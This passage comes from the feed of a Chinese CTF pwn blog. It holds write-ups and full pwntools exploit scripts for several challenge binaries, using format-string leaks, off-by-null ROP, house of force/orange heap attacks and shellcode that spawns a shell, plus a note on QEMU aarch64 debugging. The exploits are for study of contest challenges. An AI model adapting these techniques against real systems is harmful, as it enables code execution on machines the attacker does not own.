punctuation">(</span><span class="token number">0xb88</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xb88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>size <span class="token operator">=</span> realloc_hook <span class="token operator">-</span> top_chunk <span class="token operator">-</span> <span class="token number">0x20</span>add<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>realloc <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span> <span class="token operator">*</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><p><code>exec</code>函数可以执行<code>shellcode</code>，但要通过<code>isAdmin</code>的判断，所以要先通过<code>Login</code>改<code>isAdmin</code>为<code>1</code>，<code>Login</code>中的<code>password</code>为<code>SuperSecurePassword123!</code>，而要用<code>Login</code>首先要把<code>v5</code>改成<code>0</code>，所以通过<code>Send Message to Admin</code>功能溢出<code>v4</code>将<code>v5</code>覆盖成<code>0</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Password'</span><span class="token punctuation">,</span> <span class="token string">b'SuperSecurePassword123!\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Shellcode'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;orangeforce&quot;&gt;&lt;a href=&quot;#orangeforce&quot; class=&quot;headerlink&quot; title=&quot;orangeforce&quot;&gt;&lt;/a&gt;orangeforce&lt;/h3&gt;&lt;p&gt;&lt;code&gt;house of orange + house of f</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>异构pwn运行与调试</title>
    <link href="https://starrysky1004.github.io/2024/07/16/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/"/>
    <id>https://starrysky1004.github.io/2024/07/16/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/</id>
    <published>2024-07-16T15:11:50.000Z</published>
    <updated>2024-07-16T17:32:26.950Z</updated>
    
    <content type="html"><![CDATA[<p>每次比赛碰到异构就直接放弃，趁暑假准备学一下异构程序的运行和调试。未完待续…</p><h2 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h2><h3 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#必要环境</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">make</span> ninja-build pkg-config libglib2.0-dev bison flex<span class="token comment">#安装qemu</span><span class="token function">wget</span> https://download.qemu.org/qemu-9.0.1.tar.xz<span class="token function">tar</span> xvJf qemu-9.0.1.tar.xz<span class="token builtin class-name">cd</span> qemu-9.0.1./configure<span class="token function">make</span> <span class="token parameter variable">-j8</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><code>-g</code>指定端口，<code>-L</code>指定动态链接库，静态链接的程序无需该参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-aarch64 <span class="token parameter variable">-g</span> <span class="token number">1234</span> <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture aarch64<span class="token builtin class-name">set</span> endian littleadd-symbol-file ./libc/libc/lib/libc-2.21.so<span class="token comment">#连接到正在运行的pwn，端口为qemu指定的端口</span>target remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="脚本调试"><a href="#脚本调试" class="headerlink" title="脚本调试"></a>脚本调试</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;每次比赛碰到异构就直接放弃，趁暑假准备学一下异构程序的运行和调试。未完待续…&lt;/p&gt;
&lt;h2 id=&quot;aarch64&quot;&gt;&lt;a href=&quot;#aarch64&quot; class=&quot;headerlink&quot; title=&quot;aarch64&quot;&gt;&lt;/a&gt;aarch64&lt;/h2&gt;&lt;h3 id=</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="异构" scheme="https://starrysky1004.github.io/tags/%E5%BC%82%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>2024WKCTF-PWN</title>
    <link href="https://starrysky1004.github.io/2024/07/16/2024wkctf-pwn/2024wkctf-pwn/"/>
    <id>https://starrysky1004.github.io/2024/07/16/2024wkctf-pwn/2024wkctf-pwn/</id>
    <published>2024-07-16T08:41:29.000Z</published>
    <updated>2024-07-17T07:27:58.291Z</updated>
    
    <content type="html"><![CDATA[<p>题目下载地址：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF</a></p><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p><code>wait</code>中存在格式化字符串漏洞，随便测一下发现输入<code>6</code>的时候会输出一个<code>libc</code>上的地址从而得到基址，通过<code>libc</code>基址获取<code>one gadget</code>地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>echo_inner</code>中存在栈上的<code>off-by-null</code>，在栈上布置<code>rop</code>并且通过输入长度控制将<code>\x00</code>写到<code>rbp</code>，返回到上层函数之后就会抬栈运行到布置的<code>rop</code>，为了确保执行到<code>ogg</code>需要将最后<code>8</code>位覆盖成<code>ogg</code>，前面全部覆盖成<code>ret</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33688</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'continue'</span><span class="token punctuation">,</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'number'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'is: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x00000000000008aa</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'256)? '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>漏洞点出在<code>edit</code>可以堆溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  _DWORD size<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0x1000u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too large"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chunk_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有<code>delete</code>且限制了<code>show</code>的长度为一个地址，首先想到的就是<code>house of orange</code></p><p>伪造<code>top chunk</code>的条件：</p><ul><li>保证原本<code>old top chunk</code>的<code>size</code>大于<code>MINSIZE</code></li><li>保证原本<code>old top chunk</code>的<code>prev_inuse</code>位是<code>1</code></li><li>原本<code>old top chunk</code>的地址加上其<code>size</code>之后的地址要与页对齐 也就是<code>address &amp; 0xfff = 0x000</code></li><li><code>old chunk</code>的<code>size</code>要小于申请的堆块大小加上<code>MINSIZE</code></li></ul><p>当申请的堆大小大于伪造的<code>top chunk</code>大小时会将<code>top chunk</code>释放，释放的大小为<code>top chunk size - 0x20</code>，并且根据释放的大小判断进入<code>fastbin</code>或者<code>unsorted bin</code></p><p>所以本题可以先释放一次<code>top chunk</code>到<code>unsorted bin</code>泄露<code>libc</code>，再释放一次<code>top chunk</code>到<code>fastbin</code>进行<code>fastbin attack</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33747</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1b8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token 